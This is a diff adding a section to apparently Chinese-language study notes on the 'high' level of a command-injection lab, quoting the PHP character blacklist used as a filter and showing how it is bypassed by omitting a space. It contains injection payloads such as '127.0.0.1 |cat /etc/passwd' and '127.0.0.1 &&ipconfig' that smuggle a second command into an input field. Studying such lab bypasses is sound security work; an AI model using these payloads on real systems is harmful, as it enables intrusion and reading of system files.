@@ -181,3 +181,43 @@ dir file.txt && echo "存在" || echo "不存在"
 
 
 
+
+
+### 3. high
+
+> 高级
+>
+> 代码
+
+```php
+# 做了更多字符过滤   
+// Set blacklist
+    $substitutions = array(
+        '&'  => '',
+        ';'  => '',
+        '| ' => '',
+        '-'  => '',
+        '$'  => '',
+        '('  => '',
+        ')'  => '',
+        '`'  => '',
+        '||' => '',
+    );
+
+    // Remove any of the charactars in the array (blacklist).
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+```
+
+> 不加空格也可以
+
+```shell
+# windows
+127.0.0.1 &&ipconfig
+
+# linux
+127.0.0.1 |cat /etc/passwd
+```
+
+
+
